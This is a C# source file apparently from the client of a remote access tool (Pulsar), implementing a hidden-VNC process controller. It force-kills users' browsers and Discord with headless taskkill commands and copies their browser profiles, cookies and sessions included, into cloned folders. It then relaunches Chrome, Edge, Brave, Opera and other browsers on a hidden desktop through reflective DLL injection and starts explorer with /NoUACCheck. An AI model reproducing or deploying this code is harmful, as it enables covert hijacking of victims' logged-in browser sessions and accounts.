using Microsoft.Win32;
using Pulsar.Client.Helper.HVNC.Chromium;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Helper.HVNC
{
    public class ProcessController
    {
        public ProcessController(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint WAIT_TIMEOUT = 0x00000102;
        private const uint INFINITE = 0xFFFFFFFF;

        private void CloneDirectory(string sourceDir, string destinationDir)
        {
            if (!Directory.Exists(sourceDir))
            {
                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
            }

            Directory.CreateDirectory(destinationDir);

            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);

            foreach (var dir in directories)
            {
                try
                {
                    string targetDir = dir.Replace(sourceDir, destinationDir);
                    Directory.CreateDirectory(targetDir);
                }
                catch (Exception) { }
            }

            foreach (var file in files)
            {
                try
                {
                    string targetFile = file.Replace(sourceDir, destinationDir);
                    File.Copy(file, targetFile, true);
                }
                catch (UnauthorizedAccessException) { }
                catch (IOException) { }
                catch (Exception) { }
            }
        }

        private static bool DeleteFolder(string folderPath)
        {
            bool result;
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Directory.Delete(folderPath, true);
                    result = true;
                }
                else
                {
                    Debug.WriteLine("Folder does not exist.");
                    result = false;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error deleting folder: " + ex.Message);
                result = false;
            }
            return result;
        }

        public void StartCmd()
        {
            string path = "conhost cmd.exe";
            this.CreateProc(path);
        }

        public void StartPowershell()
        {
            string path = "conhost powershell.exe";
            this.CreateProc(path);
        }

        public void StartGeneric(string path)
        {
            string command = "conhost " + path;
            this.CreateProc(command);
        }

        public void StartFirefox()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";

                if (!Directory.Exists(path))
                {
                    return;
                }

                string sourceDir = Path.Combine(path, "Profiles");
                if (!Directory.Exists(sourceDir))
                {
                    return;
                }

                string text = Path.Combine(path, "fudasf");
                string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(filePath);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartFirefox();
                    return;
                }

                string filePath2 = "Conhost --headless cmd.exe /c start firefox --profile=\"" + text + "\"";
                this.CreateProc(filePath2);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Firefox: " + ex.Message);
            }
        }

        public void StartBrave(byte[] dllbytes)
        {
            try
            {
                var braveConfig = BrowserConfiguration.GetConfig("Brave");
                if (braveConfig == null || !BrowserConfiguration.ValidateConfig(braveConfig))
                {
                    Debug.WriteLine("Brave executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Brave at: {braveConfig.ExecutablePath}");

                string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine("Waiting for Brave processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(braveConfig.SearchPattern, braveConfig.ReplacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, braveConfig.ExecutablePath, braveConfig.SearchPattern, braveConfig.ReplacementPath);
                    Debug.WriteLine("Brave started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Brave DLL injection: {injectionEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Brave: " + ex.Message);
            }
        }

        public void StartOpera(byte[] dllbytes)
        {
            try
            {
                var operaConfig = BrowserConfiguration.GetConfig("Opera");
                if (operaConfig == null || !BrowserConfiguration.ValidateConfig(operaConfig))
                {
                    Debug.WriteLine("Opera executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Opera at: {operaConfig.ExecutablePath}");

                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine("Waiting for Opera processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(operaConfig.SearchPattern, operaConfig.ReplacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath);
                    Debug.WriteLine("Opera started successfully with reflective DLL injection.");

                    Thread.Sleep(2000);
                    Task.Run(async () =>
                    {
                        await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
                    });
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Opera DLL injection: {injectionEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Opera: " + ex.Message);
            }
        }

        public void StartOperaGX(byte[] dllbytes)
        {
            try
            {
                var operaGXConfig = BrowserConfiguration.GetConfig("OperaGX");
                if (operaGXConfig == null || !BrowserConfiguration.ValidateConfig(operaGXConfig))
                {
                    Debug.WriteLine("OperaGX executable not found.");
                    return;
                }

                Debug.WriteLine($"Found OperaGX at: {operaGXConfig.ExecutablePath}");

                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine("Waiting for OperaGX processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
                    Debug.WriteLine("OperaGX started successfully with reflective DLL injection.");

                    // Apply Opera patcher asynchronously after injection
                    Thread.Sleep(2000);
                    Task.Run(async () =>
                    {
                        await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
                    });
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during OperaGX DLL injection: {injectionEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting OperaGX: " + ex.Message);
            }
        }

        public void StartEdge(byte[] dllbytes)
        {
            try
            {
                var edgeConfig = BrowserConfiguration.GetConfig("Edge");
                if (edgeConfig == null || !BrowserConfiguration.ValidateConfig(edgeConfig))
                {
                    Debug.WriteLine("Edge executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Edge at: {edgeConfig.ExecutablePath}");

                string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine("Waiting for Edge processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(edgeConfig.SearchPattern, edgeConfig.ReplacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, edgeConfig.ExecutablePath, edgeConfig.SearchPattern, edgeConfig.ReplacementPath);
                    Debug.WriteLine("Edge started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during Edge DLL injection: {injectionEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Edge: " + ex.Message);
            }
        }

        public void Startchrome(byte[] dllbytes)
        {
            try
            {
                var chromeConfig = BrowserConfiguration.GetChromeConfig();
                if (chromeConfig == null)
                {
                    Debug.WriteLine("Chrome executable not found.");
                    return;
                }

                Debug.WriteLine($"Found Chrome at: {chromeConfig.ExecutablePath}");

                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine("Waiting for Chrome processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(chromeConfig.SearchPattern, chromeConfig.ReplacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, chromeConfig.ExecutablePath, chromeConfig.SearchPattern, chromeConfig.ReplacementPath);
                    Debug.WriteLine("Chrome started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during DLL injection: {injectionEx.Message}");
                    return;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Chrome: " + ex.Message);
                return;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        /// <summary>
        /// Generic method to start any browser by type with reflective DLL injection
        /// </summary>
        /// <param name="browserType">Type of browser (Chrome, Edge, Brave, Opera, OperaGX)</param>
        /// <param name="dllbytes">DLL bytes to inject</param>
        public void StartBrowser(string browserType, byte[] dllbytes)
        {
            try
            {
                if (browserType.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
                {
                    Startchrome(dllbytes);
                    return;
                }

                var config = BrowserConfiguration.GetConfig(browserType);
                if (config == null || !BrowserConfiguration.ValidateConfig(config))
                {
                    Debug.WriteLine($"{browserType} executable not found.");
                    return;
                }

                Debug.WriteLine($"Found {browserType} at: {config.ExecutablePath}");

                string processName = Path.GetFileNameWithoutExtension(config.ExecutablePath).ToLower();
                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";

                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine($"Waiting for {browserType} processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(config.SearchPattern, config.ReplacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath);
                    Debug.WriteLine($"{browserType} started successfully with reflective DLL injection.");

                    if (browserType.Equals("Opera", StringComparison.OrdinalIgnoreCase) ||
                          browserType.Equals("OperaGX", StringComparison.OrdinalIgnoreCase))
                    {
                        Thread.Sleep(2000);
                        Task.Run(async () =>
            {
                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
            });
                    }
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during {browserType} DLL injection: {injectionEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error starting {browserType}: {ex.Message}");
            }
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        public void StartDiscord()
        {
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
            if (!File.Exists(discordPath)) return;

            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
            this.CreateProc(killCommand);
            Thread.Sleep(1000);
            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
            this.CreateProc(startCommand);
        }

        public void StartExplorer()
        {
            uint num = 2U;
            string name = "TaskbarGlomLevel";
            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue(name);
                    if (value is uint)
                    {
                        uint num2 = (uint)value;
                        if (num2 != num)
                        {
                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
                        }
                    }
                }
            }
            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
            this.CreateProc(explorerPath);
        }

        /// <summary>
        /// Clones browser profile from SearchPattern to ReplacementPath
        /// </summary>
        /// <param name="searchPattern">Relative path pattern (e.g., "Local\Google\Chrome\User Data")</param>
        /// <param name="replacementPath">Relative path for destination (e.g., "Local\Google\Chrome\KDOT")</param>
        private void CloneBrowserProfile(string searchPattern, string replacementPath)
        {
            try
            {
                string baseDir;
                if (searchPattern.StartsWith("Local\\", StringComparison.OrdinalIgnoreCase))
                {
                    baseDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    searchPattern = searchPattern.Substring(6); // rem "Local\" prefix
                    replacementPath = replacementPath.Substring(6); // rem "Local\" prefix
                }
                else if (searchPattern.StartsWith("Roaming\\", StringComparison.OrdinalIgnoreCase))
                {
                    baseDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    searchPattern = searchPattern.Substring(8); // rem "Roaming\" prefix
                    replacementPath = replacementPath.Substring(8); // rem "Roaming\" prefix
                }
                else
                {
                    Debug.WriteLine($"Invalid search pattern format: {searchPattern}");
                    return;
                }

                string sourceDir = Path.Combine(baseDir, searchPattern);
                string destDir = Path.Combine(baseDir, replacementPath);

                Debug.WriteLine($"Cloning browser profile from '{sourceDir}' to '{destDir}'");

                if (!Directory.Exists(sourceDir))
                {
                    Debug.WriteLine($"Source directory does not exist: {sourceDir}");
                    return;
                }

                // get rid of it if it's already there
                if (Directory.Exists(destDir))
                {
                    Debug.WriteLine($"Removing existing destination directory: {destDir}");
                    DeleteFolder(destDir);
                }

                CloneDirectory(sourceDir, destDir);
                Debug.WriteLine("Browser profile cloned successfully.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error cloning browser profile: {ex.Message}");
            }
        }

        /// <summary>
        /// Waits for a process to complete with a timeout
        /// </summary>
        /// <param name="processInfo">Process information structure</param>
        /// <param name="timeoutMs">Timeout in milliseconds (default 5000ms)</param>
        /// <returns>True if process completed within timeout, false otherwise</returns>
        private bool WaitForProcessCompletion(PROCESS_INFORMATION processInfo, uint timeoutMs = 5000)
        {
            try
            {
                if (processInfo.hProcess == IntPtr.Zero)
                    return false;

                uint result = WaitForSingleObject(processInfo.hProcess, timeoutMs);

                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);

                return result == WAIT_OBJECT_0;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error waiting for process: {ex.Message}");
                return false;
            }
        }

        public void StartGenericChromium(byte[] dllbytes, string browserPath, string searchPattern, string replacementPath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
                {
                    Debug.WriteLine($"Generic Chromium browser executable not found at: {browserPath}");
                    return;
                }

                if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
                {
                    Debug.WriteLine("Search pattern and replacement path are required for generic Chromium browser.");
                    return;
                }

                Debug.WriteLine($"Starting Generic Chromium Browser: {browserPath}");
                Debug.WriteLine($"Search Pattern: {searchPattern}");
                Debug.WriteLine($"Replacement Path: {replacementPath}");

                string processName = Path.GetFileNameWithoutExtension(browserPath);
                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";
                
                STARTUPINFO startupInfo = default(STARTUPINFO);
                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                startupInfo.lpDesktop = this.DesktopName;
                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);

                Debug.WriteLine($"Killing any existing {processName}.exe processes...");
                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
                {
                    Debug.WriteLine($"Waiting for {processName}.exe processes to terminate...");
                    WaitForProcessCompletion(processInfo, 5000);
                }
                else
                {
                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
                    Thread.Sleep(500);
                }

                CloneBrowserProfile(searchPattern, replacementPath);

                try
                {
                    KDOTInjector.Start(dllbytes, browserPath, searchPattern, replacementPath);
                    Debug.WriteLine($"Generic Chromium browser started successfully with reflective DLL injection.");
                }
                catch (Exception injectionEx)
                {
                    Debug.WriteLine($"Error during generic Chromium DLL injection: {injectionEx.Message}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error starting generic Chromium browser: {ex.Message}");
            }
        }

        private string DesktopName;

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }

        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }
    }
}